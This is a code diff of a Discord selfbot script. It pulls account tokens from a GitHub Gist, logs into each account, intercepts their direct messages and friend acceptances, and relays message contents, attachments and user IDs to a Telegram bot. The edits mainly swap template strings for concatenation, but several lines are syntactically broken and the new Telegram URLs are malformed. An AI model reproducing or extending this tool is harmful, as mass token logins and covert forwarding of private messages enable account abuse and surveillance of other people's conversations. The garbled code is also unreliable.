@@ -60,7 +60,7 @@ function createSelfbotInstance(token, index) {
         const cleanToken = token ? token.trim() : '';
 
         if (!cleanToken) {
-            console.error(`❌ [Account #${accountNumber}] Skipped: Empty space or trailing comma on this position.`);
+            console.error('❌ [Account #' + accountNumber + '] Skipped: Empty space or trailing comma on this position.');
             resolve();
             return;
         }
@@ -69,8 +69,8 @@ function createSelfbotInstance(token, index) {
         const knownFriends = new Set();
 
         client.on('ready', async () => {
-            console.log(`[Account #${accountNumber}] Logged in as ${client.user.tag}`);
-            activeAccounts.push(`• Account #${accountNumber}: ${client.user.tag} (ID: ${client.user.id})`);
+            console.log('[Account #' + accountNumber + '] Logged in as ' + client.user.tag);
+            activeAccounts.push('• Account #' + accountNumber + ': ' + client.user.tag + ' (ID: ' + client.user.id + ')');
 
             client.relationships.friendCache.forEach((user, id) => {
                 knownFriends.add(id);
@@ -91,15 +91,15 @@ function createSelfbotInstance(token, index) {
                         knownFriends.add(data.id);
                         
                         const friendUser = await client.users.fetch(data.id).catch(() => data.user);
-                        console.log(`[${client.user.username || 'Selfbot'}] Instant Raw Friend Alert: ${friendUser.username || data.id}`);
+                        console.log('[' + (client.user.username || 'Selfbot') + '] Instant Raw Friend Alert: ' + (friendUser.username || data.id));
 
                         const friendTag = friendUser.discriminator && friendUser.discriminator !== '0' 
-                            ? `${friendUser.username}#${friendUser.discriminator}` 
+                            ? friendUser.username + '#' + friendUser.discriminator 
                             : friendUser.username;
 
-                        const alertText = `🎉 Friend Request Accepted!\n\n` +
-                                          `Account: ${client.user.tag}\n` +
-                                          `New Friend: ${friendTag} (${data.id})`;
+                        const alertText = '🎉 Friend Request Accepted!\n\n' +
+                                          'Account: ' + client.user.tag + '\n' +
+                                          'New Friend: ' + friendTag + ' (' + data.id + ')';
                         
                         await sendToTelegram(alertText);
                     }
@@ -120,7 +120,7 @@ function createSelfbotInstance(token, index) {
                         // Clear cache entry later to keep memory usage minimal
                         setTimeout(() => processedMessageIds.delete(data.id), 60000);
 
-                        console.log(`[${client.user.username || 'Selfbot'}] Instant Raw DM Packet Intercepted!`);
+                        console.log('[' + (client.user.username || 'Selfbot') + '] Instant Raw DM Packet Intercepted!');
 
                         // Fetch the active message layout instance dynamically to parse attachment objects safely
                         const channel = await client.channels.fetch(data.channel_id).catch(() => null);
@@ -131,7 +131,7 @@ function createSelfbotInstance(token, index) {
                                     await handleValidDM(client, message);
                                 }
                             } catch (fetchErr) {
-                                console.error(`[${client.user.username || 'Selfbot'}] Could not fetch message details via raw packet:`, fetchErr.message);
+                                console.error('[' + (client.user.username || 'Selfbot') + '] Could not fetch message details via raw packet:', fetchErr.message);
                             }
                         }
                     }
@@ -160,15 +160,15 @@ function createSelfbotInstance(token, index) {
                 if (relationship.type === 'friend' && !knownFriends.has(relationship.id)) {
                     knownFriends.add(relationship.id);
                     const friendUser = relationship.user;
-                    console.log(`[${client.user.username}] Friend acceptance verified via fallback: ${friendUser.tag}`);
+                    console.log('[' + client.user.username + '] Friend acceptance verified via fallback: ' + friendUser.tag);
 
-                    const alertText = `🎉 Friend Request Accepted!\n\n` +
-                                      `Account: ${client.user.tag}\n` +
-                                      `New Friend: ${friendUser.tag} (${friendUser.id})`;
+                    const alertText = '🎉 Friend Request Accepted!\n\n' +
+                                      'Account: ' + client.user.tag + '\n' +
+                                      'New Friend: ' + friendUser.tag + ' (' + friendUser.id + ')';
                     await sendToTelegram(alertText);
                 }
             } catch (error) {
-                console.error(`[${client.user.username || 'Unknown'}] Error in fallback relationshipAdd tracking:`, error);
+                console.error('[' + (client.user.username || 'Unknown') + '] Error in fallback relationshipAdd tracking:', error);
             }
         });
 
@@ -177,19 +177,19 @@ function createSelfbotInstance(token, index) {
                 client.relationships.friendCache.forEach(async (friendUser, friendId) => {
                     if (!knownFriends.has(friendId)) {
                         knownFriends.add(friendId);
-                        const alertText = `🎉 Friend Request Accepted!\n\n` +
-                                          `Account: ${client.user.tag}\n` +
-                                          `New Friend: ${friendUser.tag} (${friendId})`;
+                        const alertText = '🎉 Friend Request Accepted!\n\n' +
+                                          'Account: ' + client.user.tag + '\n' +
+                                          'New Friend: ' + friendUser.tag + ' (' + friendId + ')';
                         await sendToTelegram(alertText);
                     }
                 });
             } catch (error) {
-                console.error(`[${client.user.username || 'Unknown'}] Error in fallback userUpdate friend tracking:`, error);
+                console.error('[' + (client.user.username || 'Unknown') + '] Error in fallback userUpdate friend tracking:', error);
             }
         });
 
         client.login(cleanToken).catch(err => {
-            console.error(`❌ [Account #${accountNumber}] Failed to log in: ${err.message}`);
+            console.error('❌ [Account #' + accountNumber + '] Failed to log in: ' + err.message);
             resolve(); 
         });
     });
@@ -198,11 +198,11 @@ function createSelfbotInstance(token, index) {
 // Separate dedicated message processing module to keep logic perfectly identical across standard/raw listeners
 async function handleValidDM(client, message) {
     try {
-        console.log(`[${client.user.username}] Forwarding validated DM to Telegram...`);
+        console.log('[' + client.user.username + '] Forwarding validated DM to Telegram...');
         
-        let text = `🎉 New Message Alert\nDM to ${client.user.tag} \nfrom ${message.author.tag} \n(${message.author.id}):`;
+        let text = '🎉 New Message Alert\nDM to ' + client.user.tag + ' \nfrom ' + message.author.tag + ' \n(' + message.author.id + '):';
         if (message.content) {
-            text += `\n${message.content}`;
+            text += '\n' + message.content;
         }
         
         if (message.attachments.size > 0) {
@@ -210,11 +210,11 @@ async function handleValidDM(client, message) {
                 if (attachment.contentType && attachment.contentType.startsWith('image/')) {
                     await sendImageToTelegram(attachment.url, text);
                 } else {
-                    text += `\n📎 Attachment: ${attachment.name}\n🔗 ${attachment.url}`;
+                    text += '\n📎 Attachment: ' + attachment.name + '\n🔗 ' + attachment.url;
                 }
             }
-            if (message.attachments.some(att => !att.contentType?.startsWith('image/'))) {
-                await sendToTelegram(text);
+if (message.attachments.some(att => !att.contentType?.startsWith('image/'))) {
+await sendToTelegram(text);
 }
 } else {
 await sendToTelegram(text);
@@ -229,8 +229,7 @@ let DISCORD_TOKENS = [];
 try {
 console.log("🌐 Fetching token list from GitHub Gist...");
 const response = await fetch(GIST_TOKENS_URL);
-if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-
+if (!response.ok) throw new Error('HTTP error! status: ' + response.status);
 const tokensContent = await response.text();
 DISCORD_TOKENS = tokensContent
 .split(/\r?\n/)
@@ -240,15 +239,15 @@ DISCORD_TOKENS = tokensContent
 console.error("❌ Failed to download tokens from Gist:", err.message);
 process.exit(1);
 }
-console.log(🔄 Processing sequential login checks for ${DISCORD_TOKENS.length} tokens...);
+console.log('🔄 Processing sequential login checks for ' + DISCORD_TOKENS.length + ' tokens...');
 for (let i = 0; i < DISCORD_TOKENS.length; i++) {
 await createSelfbotInstance(DISCORD_TOKENS[i], i);
 await sleep(1200);
 }
-console.log(\n🏁 Verification completed. Pushing active dashboard list to Telegram...);
-const startupMessage = 🤖 **Selfbots Online & Monitoring Active!**\n\n +
-Total Accounts Monitored: **${activeAccounts.length} / ${DISCORD_TOKENS.length}**\n\n +
-**Active Accounts:**\n${activeAccounts.length > 0 ? activeAccounts.join('\n') : 'None'};
+console.log('\n🏁 Verification completed. Pushing active dashboard list to Telegram...');
+const startupMessage = '🤖 Selfbots Online & Monitoring Active!\n\n' +
+'Total Accounts Monitored: ' + activeAccounts.length + ' / ' + DISCORD_TOKENS.length + '\n\n' +
+'Active Accounts:\n' + (activeAccounts.length > 0 ? activeAccounts.join('\n') : 'None');
 await sendToTelegram(startupMessage);
 }
 bootSequence();
@@ -256,7 +255,7 @@ bootSequence();
 async function sendImageToTelegram(imageUrl, caption) {
 if (!TELEGRAM_CHAT_ID) return;
 try {
- const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+const url = 'telegram.org' + TELEGRAM_BOT_TOKEN + '/sendPhoto';
 const response = await fetch(url, {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
@@ -269,17 +268,17 @@ caption: caption
 const result = await response.json();
 if (!result.ok) {
 console.error('Telegram API error (image):', result);
-await sendToTelegram(caption + \n🖼️ Image: ${imageUrl});
+await sendToTelegram(caption + '\n🖼️ Image: ' + imageUrl);
 }
 } catch (error) {
 console.error('Error sending image to Telegram:', error);
-await sendToTelegram(caption + \n🖼️ Image: ${imageUrl});
+await sendToTelegram(caption + '\n🖼️ Image: ' + imageUrl);
 }
 }
 async function sendToTelegram(text) {
 if (!TELEGRAM_CHAT_ID) return;
 try {
-const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+const url = 'telegram.org' + TELEGRAM_BOT_TOKEN + '/sendMessage';
 const response = await fetch(url, {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
